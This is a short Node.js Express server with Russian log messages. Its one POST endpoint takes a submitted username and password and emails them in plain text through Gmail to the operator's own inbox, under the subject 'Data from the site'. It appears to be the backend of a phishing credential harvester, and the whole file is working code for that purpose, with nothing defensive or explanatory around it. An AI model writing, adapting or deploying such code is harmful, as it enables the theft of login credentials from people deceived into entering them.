const express = require('express');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
app.use(express.json());

app.post('/send', async (req, res) => {
    const { username, password } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
        }
    });

    try {
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER,
            subject: 'Данные с сайта',
            text: `Username: ${username}, Password: ${password}`
        });
        res.status(200).send('Email отправлен успешно!');
    } catch (error) {
        console.error('Ошибка отправки:', error);
        res.status(500).send('Ошибка отправки email');
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
